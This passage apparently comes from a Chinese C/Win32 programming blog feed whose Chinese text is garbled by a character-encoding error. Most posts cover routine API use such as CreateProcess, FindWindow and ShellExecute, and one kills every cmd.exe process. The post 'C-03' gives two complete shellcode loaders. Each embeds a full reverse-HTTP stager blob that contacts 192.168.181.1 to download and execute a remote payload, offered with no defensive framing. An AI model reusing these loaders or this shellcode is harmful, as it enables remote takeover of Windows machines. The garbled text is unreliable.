å¦‚æœä½¿ç”¨%såªä¼šæ˜¾ç¤ºç¬¬ä¸€ä¸ªå­—æ¯(æˆ‘è¿™é‡Œé»˜è®¤å­—ç¬¦é›†æ˜¯ä½¿ç”¨Unicodeå­—ç¬¦é›†)</span></span><br><span class="line">        <span class="comment">// æˆ–è€…å°†é¡¹ç›®å­—ç¬¦é›†ä¿®æ”¹ä¸º æœªè®¾ç½®å³å¯</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%ls      %d\n&quot;</span>, pe.szExeFile, pe.th32ProcessID);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="è¿›ç¨‹å…³é—­"><a href="#è¿›ç¨‹å…³é—­" class="headerlink" title="è¿›ç¨‹å…³é—­"></a>è¿›ç¨‹å…³é—­</h4><p>å¼ºåˆ¶ å…³é—­è¿›ç¨‹/çº¿ç¨‹   TerminateProcess()</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_DEPRECATE 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_NONSTDC_NO_DEPRECATE 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	HANDLE hd =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);  <span class="comment">//éå†æ‰€æœ‰è¿›ç¨‹</span></span><br><span class="line">	PROCESSENTRY32 pe;</span><br><span class="line">	pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line"></span><br><span class="line">	Process32First(hd, &amp;pe);</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* name = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">	<span class="keyword">while</span> (Process32Next(hd, &amp;pe)) &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//printf(&quot;%s      %d\n&quot;, pe.szExeFile, pe.th32ProcessID);</span></span><br><span class="line">		HANDLE ClosedProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe.th32ProcessID);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((stricmp(<span class="string">&quot;cmd.exe&quot;</span>,pe.szExeFile))== <span class="number">0</span>) &#123;<span class="comment">// stricmp i å¿½ç•¥å¤§å°å†™</span></span><br><span class="line">			<span class="comment">//stricmp è¦åœ¨å‰é¢åŠ ä¸Šä¸¤è¡Œæ³¨é‡Š ä¸ç„¶ä¼šæŠ¥é”™  #define _CRT_SECURE_NO_DEPRECATE 1 å’Œ #define _CRT_NONSTDC_NO_DEPRECATE 1</span></span><br><span class="line"></span><br><span class="line">			TerminateProcess(ClosedProcess, <span class="number">-1</span>);</span><br><span class="line">			</span><br><span class="line">		&#125; </span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-03_åŠ è½½shellcode</title>
    <url>/posts/61fea0e9/</url>
    <content><![CDATA[<h4 id="åŠ è½½shellcodeåˆ°å†…å­˜æ‰§è¡Œ"><a href="#åŠ è½½shellcodeåˆ°å†…å­˜æ‰§è¡Œ" class="headerlink" title="åŠ è½½shellcodeåˆ°å†…å­˜æ‰§è¡Œ"></a>åŠ è½½shellcodeåˆ°å†…å­˜æ‰§è¡Œ</h4><h5 id="1"><a href="#1" class="headerlink" title="1"></a>1</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x44\x6f\x67\x43\x73\x44\x6f\x67\x43\x73\x2e\x6a\x73\x00\xce\x32\x3f\xe1\xbc\x7e\xdf\x16\xc5\xec\xd3\x08\xa5\xa9\xfd\xe8\x0c\x62\x21\x9e\x58\x71\xdb\xc4\x1c\xb5\xb7\x6a\x51\x66\x5b\x16\x92\xe3\x50\x3e\xb9\x43\x9e\xab\xc4\xa6\x36\x6c\x68\xaa\x2a\x9c\xe8\xcd\x32\xc3\x22\x78\x77\x17\xb0\xb6\xae\x7d\x2c\xbb\x0c\x04\x0e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\x99\xc4\xdc\xc9\x44\xd2\x8a\xbf\x32\xa7\x06\x20\x29\x57\x58\x03\x21\xae\xab\x53\x2b\x60\xe6\x68\xcd\xcb\xc0\xee\x23\xb5\x0b\xa0\xa7\xf0\x61\xec\x55\x34\x3e\x5c\xaa\xe3\x9f\xb0\x6c\xa8\xd3\x05\xfd\xb4\x9b\xad\xed\x36\x4b\xee\x9d\xec\xfa\x18\x6d\xf1\x33\xc7\x88\x3a\x64\x77\x98\x98\x26\x89\xcb\xa9\x51\x39\xe8\x50\xa5\xba\xaf\xe4\x9b\x2f\x51\x99\x44\xac\x5f\xcf\xbc\x8a\xac\x06\xa7\x59\x1a\xf4\xfd\xc7\x34\xe7\xdc\xd0\xd6\x38\x64\x53\xbc\xea\x6e\x75\xcc\x87\x50\x99\xee\x5a\xaa\x10\xf0\x75\x16\x75\xe5\x80\x10\xe3\xb6\x7f\xe6\x2f\xc5\xcb\x5c\x2c\x6b\xbb\xb4\x73\x90\x9e\x4a\x7f\xef\x8a\xe0\x51\x25\x71\x00\x14\xdd\x20\x6d\xda\x86\x08\xef\x90\x83\x32\x76\xb5\xf4\xcc\xdd\x4f\x0d\x7e\xb2\xb9\xbb\x9d\x62\x2b\xc7\xfe\xf8\xdb\xe3\x57\x6c\x1a\xe8\x36\x08\x82\x97\xd2\xde\x3e\x53\x38\xb5\xb1\x19\xb3\x83\xe9\x39\xce\x06\xd5\x8f\x5b\x56\xc3\xdf\xa4\xfa\xda\xc8\xcf\x31\x63\x5b\x03\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x31\x2e\x31\x00\x05\xf5\xe1\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    DWORD p;</span><br><span class="line">    VirtualProtect(buf, <span class="keyword">sizeof</span>(buf), PAGE_EXECUTE_READWRITE, &amp;p);</span><br><span class="line"></span><br><span class="line">    HANDLE hd =  CreateThread(<span class="number">0</span>, <span class="number">0</span>, buf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hd, INFINITE);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="2"><a href="#2" class="headerlink" title="2"></a>2</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x44\x6f\x67\x43\x73\x44\x6f\x67\x43\x73\x2e\x6a\x73\x00\xce\x32\x3f\xe1\xbc\x7e\xdf\x16\xc5\xec\xd3\x08\xa5\xa9\xfd\xe8\x0c\x62\x21\x9e\x58\x71\xdb\xc4\x1c\xb5\xb7\x6a\x51\x66\x5b\x16\x92\xe3\x50\x3e\xb9\x43\x9e\xab\xc4\xa6\x36\x6c\x68\xaa\x2a\x9c\xe8\xcd\x32\xc3\x22\x78\x77\x17\xb0\xb6\xae\x7d\x2c\xbb\x0c\x04\x0e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\x99\xc4\xdc\xc9\x44\xd2\x8a\xbf\x32\xa7\x06\x20\x29\x57\x58\x03\x21\xae\xab\x53\x2b\x60\xe6\x68\xcd\xcb\xc0\xee\x23\xb5\x0b\xa0\xa7\xf0\x61\xec\x55\x34\x3e\x5c\xaa\xe3\x9f\xb0\x6c\xa8\xd3\x05\xfd\xb4\x9b\xad\xed\x36\x4b\xee\x9d\xec\xfa\x18\x6d\xf1\x33\xc7\x88\x3a\x64\x77\x98\x98\x26\x89\xcb\xa9\x51\x39\xe8\x50\xa5\xba\xaf\xe4\x9b\x2f\x51\x99\x44\xac\x5f\xcf\xbc\x8a\xac\x06\xa7\x59\x1a\xf4\xfd\xc7\x34\xe7\xdc\xd0\xd6\x38\x64\x53\xbc\xea\x6e\x75\xcc\x87\x50\x99\xee\x5a\xaa\x10\xf0\x75\x16\x75\xe5\x80\x10\xe3\xb6\x7f\xe6\x2f\xc5\xcb\x5c\x2c\x6b\xbb\xb4\x73\x90\x9e\x4a\x7f\xef\x8a\xe0\x51\x25\x71\x00\x14\xdd\x20\x6d\xda\x86\x08\xef\x90\x83\x32\x76\xb5\xf4\xcc\xdd\x4f\x0d\x7e\xb2\xb9\xbb\x9d\x62\x2b\xc7\xfe\xf8\xdb\xe3\x57\x6c\x1a\xe8\x36\x08\x82\x97\xd2\xde\x3e\x53\x38\xb5\xb1\x19\xb3\x83\xe9\x39\xce\x06\xd5\x8f\x5b\x56\xc3\xdf\xa4\xfa\xda\xc8\xcf\x31\x63\x5b\x03\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x31\x2e\x31\x00\x05\xf5\xe1\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* code = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    CopyMemory(code, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//	CreateThread(0, 0, code, 0, 0, 0);  //æˆ–è€…asm å†…è”æ±‡ç¼–</span></span><br><span class="line">    _asm &#123;</span><br><span class="line">        mov eax, code <span class="comment">//åœ°å€</span></span><br><span class="line">            push eax</span><br><span class="line">            ret</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="-2"><a href="#-2" class="headerlink" title></a></h4><h4 id="-3"><a href="#-3" class="headerlink" title></a></h4>]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-02_CreateProcessæ— æ³•åˆ›å»ºè¿›ç¨‹é—®é¢˜è§£å†³æ–¹æ³•</title>
    <url>/posts/8b05e7a5/</url>
    <content><![CDATA[<p>æœ€è¿‘åœ¨ä½¿ç”¨CreateProcessæ—¶ æ— æ³•æˆåŠŸåˆ›å»ºè¿›ç¨‹ å‚è€ƒ<a href="https://blog.csdn.net/hany3000/article/details/34622701%E5%BE%97%E7%9F%A5">https://blog.csdn.net/hany3000/article/details/34622701å¾—çŸ¥</a> <strong>åœ¨è°ƒç”¨CreateProcessä¹‹å‰ï¼ŒæŠŠå¸¸é‡å­—ç¬¦ä¸²å¤åˆ¶åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº</strong>  </p>
<p><code>CreateProcess(&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;,NULL,NULL,NULL,NULL,NULL,NULL,NULL,&amp;info,&amp;pinfo);  </code>æ”¹ ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCHAR szPath[] = TEXT(&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;);</span><br><span class="line">CreateProcess(szPath,NULL,NULL,NULL,NULL,NULL,NULL,NULL,&amp;info,&amp;pinfo);  </span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    <span class="comment">//char szCommandLine[] = &quot;notepad&quot;;</span></span><br><span class="line">    STARTUPINFO si = &#123; <span class="keyword">sizeof</span>(si) &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW; <span class="comment">//æŒ‡å®šwShowWindowæˆå‘˜æœ‰æ•ˆ</span></span><br><span class="line">    si.wShowWindow = TRUE; <span class="comment">//æ­¤æˆå‘˜è®¾ä¸ºTRUEçš„è¯åˆ™æ˜¾ç¤ºæ–°å»ºè¿›ç¨‹çš„ä¸»çª—å£</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//WinExec(&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;, SW_SHOW);</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment">//TCHAR szCommandLine[] = TEXT(&quot;calc&quot;);</span></span><br><span class="line">    TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">    BOOL bRet = CreateProcess(szPath, <span class="comment">//åœ¨æ­¤æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//å‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line">        <span class="literal">NULL</span>,          <span class="comment">//é»˜è®¤è¿›ç¨‹å®‰å…¨æ€§</span></span><br><span class="line">        <span class="literal">NULL</span>,          <span class="comment">//é»˜è®¤çº¿ç¨‹å®‰å…¨æ€§</span></span><br><span class="line">        FALSE, <span class="comment">//æŒ‡å®šå½“å‰è¿›ç¨‹å†…å¥æŸ„ä¸å¯ä»¥è¢«å­è¿›ç¨‹ç»§æ‰¿</span></span><br><span class="line">        <span class="number">0</span>, <span class="comment">//ä¸ºæ–°è¿›ç¨‹åˆ›å»ºä¸€ä¸ªæ–°çš„æ§åˆ¶å°çª—å£  dwCreationFlags</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//ä½¿ç”¨æœ¬è¿›ç¨‹çš„ç¯å¢ƒå˜é‡</span></span><br><span class="line">        <span class="literal">NULL</span>, <span class="comment">//ä½¿ç”¨æœ¬è¿›ç¨‹çš„é©±åŠ¨å™¨å’Œç›®å½•</span></span><br><span class="line">        &amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span> (bRet) &#123;</span><br><span class="line">        CloseHandle(pi.hThread);</span><br><span class="line">        CloseHandle(pi.hProcess);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ–°è¿›ç¨‹çš„IDå·ï¼š%d\n&quot;</span>, pi.dwProcessId);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;æ–°è¿›ç¨‹çš„ä¸»çº¿ç¨‹IDå·ï¼š%d\n&quot;</span>, pi.dwThreadId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-01</title>
    <url>/posts/16e8cbb5/</url>
    <content><![CDATA[<h4 id="å‡ ä¸ªWin32APIä½¿ç”¨"><a href="#å‡ ä¸ªWin32APIä½¿ç”¨" class="headerlink" title="å‡ ä¸ªWin32APIä½¿ç”¨"></a>å‡ ä¸ªWin32APIä½¿ç”¨</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¶ˆé™¤é»‘çª—å£</span></span><br><span class="line"><span class="comment">//#pragma comment(linker, &quot;/subsystem:windows /ENTRY:mainCRTStartup&quot;)  </span></span><br><span class="line"><span class="comment">/* https://blog.csdn.net/zy_505775013/article/details/107432177 */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//system(&quot;calc&quot;);</span></span><br><span class="line">    <span class="comment">//HWND win = 0x00080644;</span></span><br><span class="line">    HWND win = <span class="built_in">FindWindowA</span>(<span class="number">0</span>, <span class="string">&quot;title&quot;</span>);</span><br><span class="line">    <span class="comment">//HWND win = FindWindowA(&quot;#32770 (å¯¹è¯æ¡†)&quot;, NULL); è¿™é‡Œç¬¬ä¸€ä¸ªå‚æ•°è¿™æ ·è®¾ç½®ä¼šæ‰¾ä¸åˆ°</span></span><br><span class="line">    HWND btn = <span class="built_in">FindWindowExA</span>(win, <span class="number">0</span>, <span class="string">&quot;Button&quot;</span>,<span class="string">&quot;Button1&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (win == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;æ²¡æ‰¾åˆ°&quot;</span>, <span class="string">&quot;æç¤º&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="string">&quot;æ‰¾åˆ°&quot;</span>, <span class="string">&quot;æç¤º å…³é—­&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//SendMessageA(btn, WM_CLOSE, 0, 0);// å…³é—­btn</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">SendMessageA(btn, BM_CLICK, 0 ,0);</span></span><br><span class="line"><span class="comment">SendMessageA(btn, BM_CLICK, 0, 0);  // ç‚¹å‡»btn</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">EnableWindow</span>(btn, <span class="number">0</span>);<span class="comment">//ç¦ç”¨</span></span><br><span class="line">    <span class="built_in">Sleep</span>(<span class="number">3000</span>);</span><br><span class="line">    <span class="built_in">EnableWindow</span>(btn, <span class="number">1</span>);<span class="comment">//å¯ç”¨</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//SetWindowPos(win, NULL, 100, 100, 200, 300, 0);</span></span><br><span class="line">    <span class="comment">//else &#123;</span></span><br><span class="line">    <span class="comment">//SetWindowTextA(win, &quot;hhhh&quot;);</span></span><br><span class="line">    <span class="comment">//SetWindowPos(win,NULL,100,100,200,300,0);</span></span><br><span class="line">    <span class="comment">/*while (1) &#123;</span></span><br><span class="line"><span class="comment">ShowWindow(win, SW_HIDE);</span></span><br><span class="line"><span class="comment">Sleep(500);</span></span><br><span class="line"><span class="comment">ShowWindow(win, SW_SHOW);</span></span><br><span class="line"><span class="comment">Sleep(500);</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pasue&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åŒæ­¥ï¼š éœ€è¦å…ˆæ‰§è¡Œå®Œè¯¥æ“ä½œåæ‰èƒ½printf</span></span><br><span class="line">    <span class="comment">//system(&quot;\&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\&quot;&quot;);  //éœ€è¦ç”¨\è¿›è¡Œè½¬ç§»&quot;å†…çš„å†…å®¹</span></span><br><span class="line">    <span class="comment">//printf(&quot;12345&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//å¼‚æ­¥</span></span><br><span class="line">    <span class="comment">//ShellExecuteA(0, &quot;open&quot;, &quot;\&quot;C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\&quot;&quot;, 0, 0, 0);</span></span><br><span class="line">    <span class="built_in">ShellExecuteA</span>(<span class="number">0</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;notepad&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>);	</span><br><span class="line">    <span class="comment">//ç¬¬ä¸€ä¸ªç³»ç»Ÿå¼¹å‡º; ç¬¬äºŒä¸ªè¡¨ç¤ºæ‰§è¡Œ; ç¬¬ä¸‰ä¸ªè¡¨ç¤ºæ‰§è¡Œçš„å‘½ä»¤è¡Œ; ç¬¬45é»˜è®¤ ;ç¬¬å…­ä¸ªæ˜¯0ä»£è¡¨çª—å£éšè— 3æœ€å¤§åŒ– 6æœ€å°åŒ–</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;12345&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



